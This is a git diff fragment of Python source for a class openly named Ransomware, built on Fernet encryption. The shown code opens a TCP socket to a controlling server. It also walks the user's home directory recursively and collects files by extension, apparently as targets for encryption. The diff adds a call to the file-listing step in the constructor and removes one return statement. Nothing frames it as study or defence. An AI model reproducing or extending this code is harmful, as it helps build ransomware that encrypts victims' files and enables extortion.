@@ -21,6 +21,7 @@ class Ransomware(Fernet):
         self.system: System = System()
         self.server: socket = socket(AF_INET, SOCK_STREAM)
         self.Private = Fernet(self.key)
+        self.list_file()
 
     def ConnectServer(self, connected = False) -> None:
         retries = 0
@@ -54,7 +55,6 @@ class Ransomware(Fernet):
         for entry in Path.home().rglob('*'):
             if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                 self.file_categories[extcategory[ext]].append(str(entry))
-        return self.file_categories
 
     def process_files(
         self, 
